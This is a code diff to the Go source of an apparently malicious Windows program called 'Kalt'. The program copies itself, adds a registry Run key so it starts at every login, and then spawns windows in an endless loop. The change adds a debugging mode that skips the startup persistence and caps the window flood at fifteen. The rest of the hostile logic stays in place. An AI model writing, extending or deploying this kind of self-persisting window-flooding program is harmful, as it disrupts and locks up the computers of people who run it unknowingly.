@@ -15,6 +15,9 @@ const (
 	rngStuff   string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	startup    string = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 	execName   string = "Kalt"
+
+	DEBUGGING             bool = false
+	DEBUGGING_MAX_WINDOWS int  = 15
 )
 
 func main() {
@@ -46,22 +49,24 @@ func main() {
 			return
 		}
 
-		handle, err := registry.OpenKey(
-			registry.CURRENT_USER,
-			startup, registry.ALL_ACCESS,
-		)
+		if !DEBUGGING {
+			handle, err := registry.OpenKey(
+				registry.CURRENT_USER,
+				startup, registry.ALL_ACCESS,
+			)
 
-		if err != nil {
-			awaitInput("error 8")
-			return
-		}
+			if err != nil {
+				awaitInput("error 8")
+				return
+			}
 
-		defer handle.Close()
+			defer handle.Close()
 
-		err = handle.SetStringValue(execName, fmt.Sprintf("\"%s\" %s", os.Args[0], startupArg))
-		if err != nil {
-			awaitInput("error 9")
-			return
+			err = handle.SetStringValue(execName, fmt.Sprintf("\"%s\" %s", os.Args[0], startupArg))
+			if err != nil {
+				awaitInput("error 9")
+				return
+			}
 		}
 
 		cmd = exec.Command(newPath, startupArg)
@@ -78,12 +83,28 @@ func main() {
 		return
 	}
 
+	if DEBUGGING {
+		fmt.Println(os.Args[0])
+		fmt.Println(os.Args[1])
+		fmt.Println(os.Args[1] == startupArg)
+	}
+
+	windows := 0
 	for {
-		go spawnWindow()
+		spawnWindow()
+
+		windows++
+		if DEBUGGING && windows >= DEBUGGING_MAX_WINDOWS {
+			break
+		}
 	}
 }
 
 func getString(length int) string {
+	if DEBUGGING {
+		return "debugging " + fmt.Sprint(length)
+	}
+
 	str := make([]byte, length)
 	for i := range str {
 		str[i] = rngStuff[rand.Intn(len(rngStuff))]
@@ -117,6 +138,10 @@ func getFolderState() bool {
 }
 
 func getStartupState() bool {
+	if DEBUGGING {
+		return true
+	}
+
 	handle, err := registry.OpenKey(
 		registry.CURRENT_USER,
 		startup, registry.ALL_ACCESS,
